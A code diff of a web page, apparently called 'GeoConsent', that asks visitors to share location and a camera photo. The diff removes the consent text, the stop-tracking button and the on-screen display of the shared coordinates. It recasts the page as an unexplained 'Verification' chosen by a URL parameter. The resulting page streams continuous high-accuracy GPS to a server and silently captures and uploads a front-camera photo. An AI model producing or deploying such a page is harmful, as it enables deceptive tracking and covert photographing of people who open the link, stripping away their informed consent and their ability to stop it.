@@ -1,134 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>GeoConsent – Share Location</title>
+  <title>GeoConsent</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
+
 <body style="font-family:sans-serif;text-align:center;padding:40px">
 
-<h2>📍 Location Verification</h2>
-<p>
-By clicking the button below, you consent to share your current GPS location.
-</p>
+<h2 id="title">Verification</h2>
+<p id="desc"></p>
 
-<button onclick="shareLocation()" style="padding:12px 20px;font-size:16px">
-Allow & Share Location
-</button>
-
-<p id="status"></p>
-<h2>📍 Location & Camera Verification</h2>
-
-<p>
-Choose what you want to share. Permissions are requested separately.
-</p>
-
-<button onclick="startLiveLocation()" style="padding:12px 20px;font-size:16px">
+<button id="gpsBtn" onclick="startGPS()" style="display:none;padding:12px 20px">
 📍 Share Live Location
 </button>
 
 <br><br>
 
-<button onclick="capturePhoto()" style="padding:12px 20px;font-size:16px">
-📷 Capture Front Camera Photo
+<button id="camBtn" onclick="capturePhoto()" style="display:none;padding:12px 20px">
+📷 Capture Front Camera
 </button>
 
 <p id="status"></p>
 
 <video id="video" autoplay playsinline style="display:none;width:100%"></video>
 <canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const mode = params.get("mode");
+
+const gpsBtn = document.getElementById("gpsBtn");
+const camBtn = document.getElementById("camBtn");
+
+if (mode === "gps") {
+  document.getElementById("title").innerText = "📍 Location Verification";
+  document.getElementById("desc").innerText =
+    "You are requested to share your live location.";
+  gpsBtn.style.display = "inline-block";
+}
+
+if (mode === "camera") {
+  document.getElementById("title").innerText = "📷 Camera Verification";
+  document.getElementById("desc").innerText =
+    "You are requested to capture a front camera photo.";
+  camBtn.style.display = "inline-block";
+}
+
+if (mode === "both") {
+  document.getElementById("title").innerText = "📍 Location + Camera Verification";
+  document.getElementById("desc").innerText =
+    "You are requested to share location and capture a photo.";
+  gpsBtn.style.display = "inline-block";
+  camBtn.style.display = "inline-block";
+}
+</script>
+
+<!-- GPS LIVE TRACKING -->
 <script>
 let watchID = null;
 
-function shareLocation() {
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported");
-    return;
-  }
+function startGPS() {
+  document.getElementById("status").innerText = "Starting live location...";
 
-  document.getElementById("status").innerText = "Starting live tracking...";
-
-  // Start watching location
   watchID = navigator.geolocation.watchPosition(
     pos => {
       fetch("/location", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: {"Content-Type":"application/json"},
         body: JSON.stringify({
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
           accuracy: pos.coords.accuracy,
           speed: pos.coords.speed || 0
         })
-      }).then(() => {
-        document.getElementById("status").innerText =
-          `Live tracking active: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
       });
     },
     err => alert("Location permission denied"),
-    {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 5000
-    }
+    { enableHighAccuracy:true }
   );
 }
-
-// Optional: Stop tracking
-function stopTracking() {
-  if (watchID !== null) {
-    navigator.geolocation.clearWatch(watchID);
-    document.getElementById("status").innerText = "Tracking stopped";
-  }
-}
 </script>
-  <script>
-async function capturePhoto() {
-  const status = document.getElementById("status");
-  status.innerText = "Requesting camera permission...";
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" } // FRONT CAMERA
+<!-- CAMERA CAPTURE -->
+<script>
+async function capturePhoto() {
+  document.getElementById("status").innerText = "Requesting camera permission...";
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode:"user" }
+  });
+
+  const video = document.getElementById("video");
+  video.style.display = "block";
+  video.srcObject = stream;
+
+  setTimeout(() => {
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    canvas.getContext("2d").drawImage(video,0,0);
+
+    const img = canvas.toDataURL("image/jpeg");
+    stream.getTracks().forEach(t => t.stop());
+    video.style.display = "none";
+
+    fetch("/capture", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ image: img })
     });
 
-    const video = document.getElementById("video");
-    video.style.display = "block";
-    video.srcObject = stream;
-
-    // Wait 2 seconds, then capture
-    setTimeout(() => {
-      const canvas = document.getElementById("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-
-      const imageData = canvas.toDataURL("image/jpeg");
-
-      // Stop camera
-      stream.getTracks().forEach(track => track.stop());
-      video.style.display = "none";
-
-      // Send image to backend
-      fetch("/capture", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ image: imageData })
-      }).then(() => {
-        status.innerText = "✅ Photo captured & sent successfully";
-      });
-
-    }, 2000);
-
-  } catch (err) {
-    alert("Camera permission denied");
-  }
+    document.getElementById("status").innerText =
+      "✅ Photo captured successfully";
+  },2000);
 }
-      </script>
+</script>
 
-<button onclick="stopTracking()" style="padding:12px 20px;margin-top:10px">
-Stop Tracking
-</button>
 </body>
-</html>	
+</html>
